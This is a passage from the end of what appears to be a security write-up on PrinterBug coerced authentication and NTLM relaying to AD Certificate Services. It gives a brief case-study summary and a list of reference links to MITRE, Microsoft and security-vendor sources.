- **Impact:** Persistent domain access; data theft; regulatory fines
- **Detection Failure:** Organization had excellent perimeter security but lacked internal NTLM relay protections
- **Reference:** [Dirkjanm: NTLM relaying to AD CS](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)

---

## 15. REFERENCES & AUTHORITATIVE SOURCES

- [MITRE ATT&CK: T1547 - Boot or Logon Autostart Execution](https://attack.mitre.org/techniques/T1547/)
- [Microsoft: PrinterBug RpcRemoteFindFirstPrinterChangeNotificationEx](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [CrowdStrike: CVE-2021-1678 - MSRPC Printer Spooler Relay](https://www.crowdstrike.com/en-us/blog/cve-2021-1678-printer-spooler-relay-security-advisory/)
- [Dirkjanm: NTLM relaying to AD CS](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)
- [SpecterOps: Certified Pre-Owned (AD CS Exploitation)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [TheHacker.recipes: MS-RPRN abuse (PrinterBug)](https://www.thehacker.recipes/a-d/movement/mitm-and-coerced-authentications/ms-rprn)
- [Fortalice Solutions: Elevating with NTLMv1 and the Printer Bug](https://www.fortalicesolutions.com/posts/elevating-with-ntlmv1-and-the-printer-bug)
- [Microsoft: Enhanced Protection for Authentication (EPA)](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-access-do-not-allow-anonymous-enumeration-of-sam-accounts-and-shares)
- [Silverfort: PetitPotam and Printer Bug Mitigation](https://www.silverfort.com/blog/silverfort-security-advisory-petitpotam-and-printer-bug/)

---